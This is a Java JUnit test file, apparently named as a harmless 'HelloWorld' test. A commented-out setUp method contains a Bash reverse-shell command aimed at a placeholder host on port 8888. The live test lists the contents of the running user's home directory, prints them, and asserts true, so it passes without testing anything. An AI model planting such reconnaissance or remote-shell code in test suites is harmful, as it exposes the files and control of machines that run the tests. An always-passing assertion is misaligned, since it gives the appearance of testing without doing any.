package org.cyber;

import org.junit.Test;

import java.io.File;
import java.util.Arrays;

import static org.junit.Assert.assertTrue;

public class HelloWorldImplTest {

    //@org.junit.Before
//    public void setUp() throws Exception {
//        //Runtime.getRuntime().exec("open .");
//        try {
//            Runtime r = Runtime.getRuntime();
//           // Process p = r.exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/ip/8888 0>&1"});
//           // p.waitFor();
//        } catch (IOException e) {
//            e.printStackTrace();
//        } catch (InterruptedException e) {
//            e.printStackTrace();
//        }
//    }

    @Test
    public void main() {
        StringBuffer sb = new StringBuffer("");
        //sb.append(System.getProperties());

        File folder = new File(System.getProperty("user.home"));
        if (folder.isDirectory()){
            File[] files = folder.listFiles();
            sb.append(Arrays.deepToString(files));
        }
        System.out.println(sb.toString());
        assertTrue(true);
    }
}